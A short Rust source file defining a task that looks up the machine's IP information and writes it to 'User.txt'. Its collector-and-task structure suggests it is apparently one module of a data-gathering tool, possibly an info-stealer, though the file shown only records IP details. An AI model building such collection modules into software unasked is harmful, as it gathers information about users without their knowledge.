use crate::alloc::borrow::ToOwned;
use alloc::format;
use collector::Collector;
use ipinfo::unwrapped_ip_info;
use tasks::{parent_name, Task};
use utils::path::{Path, WriteToFile};

pub(super) struct UserInfoTask;

impl<C: Collector> Task<C> for UserInfoTask {
    parent_name!("User.txt");

    unsafe fn run(&self, parent: &Path, _: &C) {
        let ip_info = unwrapped_ip_info();

        let _ = format!("{ip_info}").write_to(parent);
    }
}